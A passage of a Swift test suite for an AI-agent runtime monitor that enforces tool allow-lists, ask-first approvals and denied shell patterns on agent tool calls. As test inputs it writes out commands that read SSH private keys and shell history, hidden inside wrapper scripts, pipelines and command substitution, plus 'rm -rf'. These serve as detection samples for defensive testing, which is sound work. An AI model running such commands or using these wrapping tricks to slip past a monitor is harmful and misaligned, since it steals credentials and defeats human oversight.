            totalInputTokens: 50,
            totalOutputTokens: 50,
            durationMs: 100,
            numTurns: 1,
            isError: false
        )
        let _ = monitor.processEvent(result, process: nil)
        #expect(monitor.turnCount == 1)
    }

    @Test("Non-result events do not increment turn count")
    func nonResultEventsNoTurnIncrement() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 10)

        let _ = monitor.processEvent(.text(text: "hello"), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        let _ = monitor.processEvent(.toolResult(toolId: "t1", content: ""), process: nil)
        let _ = monitor.processEvent(.thinking(text: "hmm"), process: nil)

        #expect(monitor.turnCount == 0)
    }

    @Test("Max turns exceeded kills process")
    func maxTurnsExceeded() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 3)

        let result = ParsedEvent.result(
            text: "done",
            costUSD: 0.001,
            totalInputTokens: 50,
            totalOutputTokens: 50,
            durationMs: 100,
            numTurns: 1,
            isError: false
        )

        let _ = monitor.processEvent(result, process: nil) // turn 1
        #expect(monitor.maxTurnsExceeded == false)
        let _ = monitor.processEvent(result, process: nil) // turn 2
        #expect(monitor.maxTurnsExceeded == false)
        let shouldKill = monitor.processEvent(result, process: nil) // turn 3
        #expect(shouldKill == true)
        #expect(monitor.maxTurnsExceeded == true)
    }

    @Test("Unlimited turns (0) never exceeds")
    func unlimitedTurns() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 0)

        for i in 0..<50 {
            let result = ParsedEvent.result(
                text: "done \(i)",
                costUSD: 0.001,
                totalInputTokens: 10,
                totalOutputTokens: 10,
                durationMs: 100,
                numTurns: 1,
                isError: false
            )
            let _ = monitor.processEvent(result, process: nil)
        }
        #expect(monitor.maxTurnsExceeded == false)
        #expect(monitor.turnCount == 50)
    }

    @Test("ProcessResult maxTurnsExceeded flag")
    func processResultMaxTurnsFlag() {
        let result = AgentRuntimeWorker.ProcessResult(
            exitCode: 137,
            error: "max turns",
            budgetExceeded: false,
            timedOut: false,
            repetitionKilled: false,
            maxTurnsExceeded: true
        )
        #expect(result.maxTurnsExceeded == true)
        #expect(result.budgetExceeded == false)
    }
}

@Suite("Runtime Policy Guard")
struct RuntimePolicyGuardTests {
    @Test("Observed tools outside manifest allow-list stop the provider")
    func unauthorizedToolStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Read", "Glob", "Grep"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("not in the provider allow-list") == true)
    }

    @Test("Runtime support tools do not trip policy")
    func runtimeSupportToolsDoNotTripPolicy() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI,
            runtimeSupportTools: CopilotPolicyAdapter().runtimeSupportTools
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "report_intent", id: "t1", input: ["intent": "Listing open PRs"]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyViolation == false)
        #expect(monitor.policyApprovalRequired == false)
    }

    @Test("Copilot documentation support tool with empty input does not trip policy")
    func copilotDocumentationSupportToolWithEmptyInputDoesNotTripPolicy() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI,
            runtimeSupportTools: CopilotPolicyAdapter().runtimeSupportTools
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "fetch_copilot_cli_documentation", id: "t1", input: ["summary": "{}"]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyViolation == false)
        #expect(monitor.policyApprovalRequired == false)
    }

    @Test("Runtime support tool exemption does not hide actionable fields")
    func runtimeSupportToolExemptionDoesNotHideActionableFields() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI,
            runtimeSupportTools: CopilotPolicyAdapter().runtimeSupportTools
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "report_intent", id: "t1", input: ["command": "rm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("provider support tool carried action-like input") == true)
    }

    @Test("Runtime support tool schema rejects disallowed keys")
    func runtimeSupportToolSchemaRejectsDisallowedKeys() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI,
            runtimeSupportTools: CopilotPolicyAdapter().runtimeSupportTools
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "report_intent",
                id: "t1",
                input: ["summary": #"{"intent":"Listing PRs","extra":"bad"}"#]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("unsupported input keys: extra") == true)
    }

    @Test("Runtime support tool schema rejects action-like input aliases even when allowed")
    func runtimeSupportToolSchemaRejectsActionLikeAliasesEvenWhenAllowed() {
        let descriptor = ProviderRuntimeSupportToolDescriptor(
            name: "report_intent",
            purpose: "Report provider intent",
            allowedInputKeys: ["intent", "endpoint"]
        )
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI,
            runtimeSupportTools: [descriptor]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "report_intent",
                id: "t1",
                input: [
                    "intent": "Gather provider metadata",
                    "endpoint": "https://example.test/internal"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("action-like input keys") == true)
        #expect(monitor.policyViolationMessage?.contains("endpoint") == true)
    }

    @Test("Copilot task delegation is not treated as runtime support plumbing")
    func copilotTaskDelegationIsNotRuntimeSupportPlumbing() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI,
            runtimeSupportTools: CopilotPolicyAdapter().runtimeSupportTools
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "task",
                id: "t1",
                input: [
                    "description": "Report intent and fetch documentation",
                    "prompt": "Call report_intent then fetch Copilot CLI documentation.",
                    "agent_type": "task",
                    "name": "identity-fetch",
                    "mode": "sync",
                    "model": "gpt-4.1"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("not in the provider allow-list") == true)
        #expect(monitor.policyViolationMessage?.contains("provider support tool") == false)
    }

    @Test("Ask-first tool pauses for runtime approval")
    func askFirstToolPausesForRuntimeApproval() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "curl https://redcap.stanford.edu/api/"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyApprovalMessage?.contains("Permission requested for tool: Bash") == true)
        #expect(monitor.policyApprovalMessage?.contains("What ASTRA observed: Bash command: curl") == true)
        #expect(monitor.policyApprovalMessage?.contains("What allowing does: Grants Bash(curl *redcap.stanford.edu*) one time for this run") == true)
        #expect(monitor.policyApprovalMessage?.contains("What to check: Allow only if contacting that network destination is expected for this task.") == true)
        #expect(monitor.policyApprovalMessage?.contains("Runtime grant: Bash(curl *redcap.stanford.edu*)") == true)
        #expect(monitor.policyViolation == false)
    }

    @Test("JSON-wrapped shell arguments produce usable approval grants")
    func jsonWrappedShellArgumentsProduceUsableApprovalGrants() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "bash", id: "t1", input: ["summary": #"{"command":"set -euo pipefail\ngh pr list --state open"}"#]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyApprovalMessage?.contains("What ASTRA observed: Bash command: set -euo pipefail") == true)
        #expect(monitor.policyApprovalMessage?.contains("Runtime grant: Bash(gh pr list *)") == true)
        #expect(monitor.policyApprovalMessage?.contains("Bash({") == false)
        #expect(monitor.policyApprovalMessage?.contains("Bash(*)") == false)
    }

    @Test("Provider permission denial in restricted mode includes the recent command")
    func providerPermissionDenialInRestrictedModeIncludesRecentCommand() {
        let manifest = runtimePolicyManifest(allowedTools: ["Bash"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        _ = monitor.processEvent(
            .toolUse(name: "bash", id: "toolu_denied", input: ["command": "cat ~/.zsh_history"]),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(toolId: "toolu_denied", content: "Permission denied and could not request permission from user"),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyApprovalMessage?.contains("cat ~/.zsh_history") == true)
        #expect(monitor.policyApprovalMessage?.contains("Runtime grant: Bash(cat ~/.zsh_history *)") == true)
        #expect(monitor.policyViolation == false)
    }

    @Test("Provider permission denial respects denied shell policy")
    func providerPermissionDenialRespectsDeniedShellPolicy() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .permissionDenied(tool: "shell(rm)", reason: "Permission denied and could not request permission from user"),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("denied command pattern") == true)
    }

    @Test("Provider shell permission denial without command does not grant broad shell")
    func providerShellPermissionDenialWithoutCommandDoesNotGrantBroadShell() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .permissionDenied(tool: "shell", reason: "Permission denied and could not request permission from user"),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("could not validate the shell command text") == true)
        #expect(monitor.policyViolationMessage?.contains("Bash(*)") == false)
    }

    @Test("Provider permission denial in broad mode is terminal instead of another approval")
    func providerPermissionDenialInBroadModeIsTerminal() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["*"],
            allowedShellPatterns: ["*"],
            permissionMode: PermissionPolicy.autonomous.rawValue,
            providerID: .copilotCLI,
            policyLevel: .autonomous,
            usesBroadProviderPermissions: true
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        _ = monitor.processEvent(
            .toolUse(name: "bash", id: "toolu_denied", input: ["summary": #"{"command":"cat ~/.zsh_history"}"#]),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(toolId: "toolu_denied", content: "Permission denied and could not request permission from user"),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "provider_permission_denied_broad_permissions")
        #expect(monitor.runtimeStopMessage?.contains("--allow-all-tools") == true)
        #expect(monitor.runtimeStopMessage?.contains("cat ~/.zsh_history") == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Provider path permission prompt without scoped grant is terminal across runtimes")
    func providerPathPermissionPromptWithoutScopedGrantIsTerminalAcrossRuntimes() {
        for providerID in [AgentRuntimeID.claudeCode, .copilotCLI] {
            let manifest = runtimePolicyManifest(
                allowedTools: ["Read", "Glob", "Grep"],
                providerID: providerID
            )
            let monitor = AgentRuntimeWorker.ProcessMonitor(
                tokenBudget: Int.max,
                taskID: manifest.taskID,
                policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
            )

            let shouldKill = monitor.processEvent(
                .permissionDenied(tool: "WorkspaceAccess", reason: "Allow access to these paths? (y/n):"),
                process: nil
            )

            #expect(shouldKill == true)
            #expect(monitor.runtimeStopReason == "provider_permission_unresumable")
            #expect(monitor.runtimeStopMessage?.contains("WorkspaceAccess") == true)
            #expect(monitor.runtimeStopMessage?.contains("does not map to a scoped runtime permission") == true)
            #expect(monitor.policyApprovalRequired == false)
            #expect(monitor.policyViolation == false)
        }
    }

    @Test("Provider denial after applied scoped approval is terminal")
    func providerDenialAfterAppliedScopedApprovalIsTerminal() {
        let grant = PermissionGrant.shellCommand(executable: "gh", pattern: "search prs *")
        let manifest = runtimePolicyManifest(
            allowedTools: ["read", "shell(gh:search prs *)"],
            providerID: .copilotCLI,
            approvalGrants: [grant]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        _ = monitor.processEvent(
            .toolUse(
                name: "bash",
                id: "toolu_denied",
                input: [
                    "command": "gh auth status && gh search prs --author @me --state open --limit 100"
                ]
            ),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(toolId: "toolu_denied", content: "Permission denied and could not request permission from user"),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "provider_permission_denied_after_approval")
        #expect(monitor.runtimeStopMessage?.contains("already applied the scoped approval") == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Claude command approval denial after applied scoped approval is terminal")
    func claudeCommandApprovalDenialAfterAppliedScopedApprovalIsTerminal() {
        let grant = PermissionGrant.shellCommand(executable: "gh", pattern: "search prs *")
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "Bash(gh search prs *)"],
            providerID: .claudeCode,
            approvalGrants: [grant]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        _ = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "toolu_denied",
                input: [
                    "command": "gh search prs --author @me --state open --limit 100"
                ]
            ),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(toolId: "toolu_denied", content: "This command requires approval"),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "provider_permission_denied_after_approval")
        #expect(monitor.runtimeStopMessage?.contains("already applied the scoped approval") == true)
        #expect(monitor.runtimeStopMessage?.contains("Bash(gh search prs *)") == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved shell grant satisfies ask-first tool")
    func approvedShellGrantSatisfiesAskFirstTool() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "Bash(curl *)"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "curl https://redcap.stanford.edu/api/"]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved shell path grant satisfies ask-first Bash across absolute workspace path")
    func approvedShellPathGrantSatisfiesAskFirstAcrossAbsoluteWorkspacePath() {
        let manifest = runtimePolicyManifest(
            allowedTools: [
                "Read",
                "Glob",
                "Grep",
                "Bash(ls dev/workspaces/test/.astra/tasks/bf0b91bc/ *)"
            ],
            askFirstTools: ["Bash"],
            workspacePath: "/Users/alvaro1/Documents/Astra Dev/Workspaces/test"
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "t1",
                input: [
                    "command": "ls /Users/alvaro1/Documents/Astra\\ Dev/Workspaces/test/.astra/tasks/BF0B91BC/"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved shell path grant does not satisfy a different task path")
    func approvedShellPathGrantDoesNotSatisfyDifferentTaskPath() {
        let manifest = runtimePolicyManifest(
            allowedTools: [
                "Read",
                "Glob",
                "Grep",
                "Bash(ls dev/workspaces/test/.astra/tasks/bf0b91bc/ *)"
            ],
            askFirstTools: ["Bash"],
            workspacePath: "/Users/alvaro1/Documents/Astra Dev/Workspaces/test"
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "t1",
                input: [
                    "command": "ls /Users/alvaro1/Documents/Astra\\ Dev/Workspaces/test/.astra/tasks/A292D7B4/"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved substantive shell grant satisfies wrapper command")
    func approvedSubstantiveShellGrantSatisfiesWrapperCommand() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "Bash(gh search prs *)"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: [
                "command": """
                set -euo pipefail
                OUT=.astra/tasks/7A7D0BA8/open_prs.tsv
                mkdir -p "$(dirname "$OUT")"
                gh search prs --author @me --state open --json repository,title,url
                """
            ]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved shell grant ignores comments and status output in wrapper command")
    func approvedShellGrantIgnoresCommentsAndStatusOutputInWrapperCommand() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "shell(gh:search prs *)"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "bash", id: "t1", input: [
                "command": """
                set -euo pipefail
                # Check gh auth before running the search
                if ! gh auth status >/dev/null 2>&1; then
                  echo '{"error":"gh not authenticated"}'
                  exit 0
                fi
                echo "Fetching open PRs"
                gh search prs "author:@me is:open" --limit 100 --json number,title,url
                """
            ]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved read gh grant does not authorize write gh command")
    func approvedReadGhGrantDoesNotAuthorizeWriteGhCommand() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "Bash(gh pr view *)"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "gh pr merge 123 --squash --delete-branch"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyViolation == false)
        #expect(monitor.policyApprovalMessage?.contains("Runtime grant: Bash(gh pr merge 123 *)") == true)
        #expect(monitor.policyApprovalMessage?.contains("Bash(gh:*)") == false)
        #expect(monitor.policyApprovalMessage?.contains("Bash(gh *)") == false)
    }

    @Test("Wrapper setup grant does not authorize later shell command")
    func wrapperSetupGrantDoesNotAuthorizeLaterShellCommand() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "Bash(set *)"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "set -euo pipefail\ncat ~/.ssh/id_rsa"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyApprovalMessage?.contains("Runtime grant: Bash(cat ~/.ssh/id_rsa *)") == true)
        #expect(monitor.policyViolation == false)
    }

    @Test("Denied shell pattern catches wrapped command segment")
    func deniedShellPatternCatchesWrappedCommandSegment() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash", "Bash(set *)"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "set -euo pipefail\nrm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolationMessage?.contains("denied command pattern") == true)
    }

    @Test("Denied shell pattern catches absolute executable path")
    func deniedShellPatternCatchesAbsoluteExecutablePath() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "/bin/rm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyApprovalRequired == false)
    }

    @Test("Denied shell pattern wins over ask-first tool")
    func deniedShellPatternWinsOverAskFirstTool() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "rm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
    }

    @Test("Denied shell pattern catches pipeline command segment")
    func deniedShellPatternCatchesPipelineCommandSegment() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            deniedShellPatterns: ["cat:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status --short | cat ~/.ssh/id_rsa"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("denied command pattern") == true)
    }

    @Test("Denied shell pattern catches command substitution segment")
    func deniedShellPatternCatchesCommandSubstitutionSegment() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            deniedShellPatterns: ["cat:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status --short $(cat ~/.ssh/id_rsa)"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("denied command pattern") == true)
    }

    @Test("Denied shell command pattern stops the provider")
    func deniedShellPatternStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*", "swift:*"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "rm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("denied command pattern") == true)
    }

    @Test("Allowed shell command pattern continues")
    func allowedShellPatternContinues() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*", "swift:*"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status --short"]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Allowed shell patterns must cover every command segment")
    func allowedShellPatternsMustCoverEveryCommandSegment() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*", "swift:*"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "set -euo pipefail\ncat ~/.ssh/id_rsa\ngit status --short"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the allowed command patterns") == true)
    }

    @Test("Allowed shell patterns must cover every pipeline command segment")
    func allowedShellPatternsMustCoverEveryPipelineCommandSegment() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status --short | cat ~/.ssh/id_rsa"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the allowed command patterns") == true)
    }

    @Test("Allowed shell patterns must cover command substitution segments")
    func allowedShellPatternsMustCoverCommandSubstitutionSegments() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*"],
            deniedShellPatterns: ["rm:*"]
